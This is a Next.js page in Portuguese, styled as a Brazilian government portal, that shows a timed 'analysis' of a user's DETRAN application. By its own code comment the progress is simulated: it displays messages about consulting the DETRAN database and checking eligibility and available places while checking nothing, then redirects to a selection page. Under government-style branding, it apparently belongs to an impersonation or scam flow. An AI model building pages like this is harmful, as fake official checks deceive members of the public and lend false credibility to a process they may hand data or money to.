'use client';

import { useEffect, useState } from 'react';
import { useRouter } from 'next/navigation';
import GovLayout from '@/components/GovLayout';

export default function AnalisePage() {
  const router = useRouter();
  const [userName, setUserName] = useState('');
  const [progress, setProgress] = useState(0);
  const [currentStep, setCurrentStep] = useState(0);

  const steps = [
    'Verificando dados pessoais...',
    'Consultando base do DETRAN...',
    'Analisando elegibilidade...',
    'Verificando vagas disponíveis...',
    'Finalizando análise...'
  ];

  useEffect(() => {
    const userData = localStorage.getItem('usuarioLogado');
    if (userData) {
      const user = JSON.parse(userData);
      const primeiroNome = user.nome?.split(' ')[0] || '';
      setUserName(primeiroNome.toUpperCase());
    }
  }, []);

  useEffect(() => {
    // Simular progresso de análise
    const progressInterval = setInterval(() => {
      setProgress(prev => {
        if (prev >= 100) {
          clearInterval(progressInterval);
          return 100;
        }
        return prev + 2;
      });
    }, 100);

    // Atualizar steps
    const stepInterval = setInterval(() => {
      setCurrentStep(prev => {
        if (prev >= steps.length - 1) {
          clearInterval(stepInterval);
          return prev;
        }
        return prev + 1;
      });
    }, 1000);

    // Redirecionar após análise completa
    const redirectTimeout = setTimeout(() => {
      router.push('/selecao-detran');
    }, 5500);

    return () => {
      clearInterval(progressInterval);
      clearInterval(stepInterval);
      clearTimeout(redirectTimeout);
    };
  }, [router]);

  return (
    <GovLayout userName={userName} breadcrumbItems={['Cadastro', 'Análise']}>
      <div className="w-full max-w-md mx-auto">
        <div className="flex items-center gap-3 mb-6">
          <div className="flex items-center justify-center w-6 h-6 rounded-full bg-[#1351B4] text-white text-sm font-medium">6</div>
          <p className="font-semibold text-base">Analisando sua Solicitação</p>
        </div>
        
        <div className="bg-white p-8 rounded-lg shadow-sm border text-center">
          {/* Spinner */}
          <div className="mb-6 flex justify-center">
            <div className="relative">
              <div className="h-20 w-20 animate-spin rounded-full border-4 border-gray-200 border-t-[#1351B4]"></div>
              <div className="absolute inset-0 flex items-center justify-center">
                <span className="text-sm font-bold text-[#1351B4]">{progress}%</span>
              </div>
            </div>
          </div>

          {/* Barra de progresso */}
          <div className="mb-6">
            <div className="h-2 bg-gray-200 rounded-full overflow-hidden">
              <div 
                className="h-full bg-[#1351B4] transition-all duration-300 ease-out"
                style={{ width: `${progress}%` }}
              ></div>
            </div>
          </div>

          {/* Status atual */}
          <div className="mb-4">
            <p className="text-gray-700 font-medium">{steps[currentStep]}</p>
          </div>

          {/* Lista de verificações */}
          <div className="text-left space-y-2 mt-6">
            {steps.map((step, index) => (
              <div 
                key={index}
                className={`flex items-center gap-2 text-sm ${
                  index < currentStep 
                    ? 'text-green-600' 
                    : index === currentStep 
                      ? 'text-[#1351B4] font-medium' 
                      : 'text-gray-400'
                }`}
              >
                {index < currentStep ? (
                  <svg className="h-4 w-4 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                  </svg>
                ) : index === currentStep ? (
                  <div className="h-4 w-4 flex-shrink-0 animate-spin rounded-full border-2 border-gray-200 border-t-[#1351B4]"></div>
                ) : (
                  <div className="h-4 w-4 flex-shrink-0 rounded-full border-2 border-gray-300"></div>
                )}
                <span>{step.replace('...', '')}</span>
              </div>
            ))}
          </div>
        </div>

        <p className="text-center text-sm text-gray-500 mt-4">
          Por favor, aguarde enquanto processamos sua solicitação.
        </p>
      </div>
    </GovLayout>
  );
}
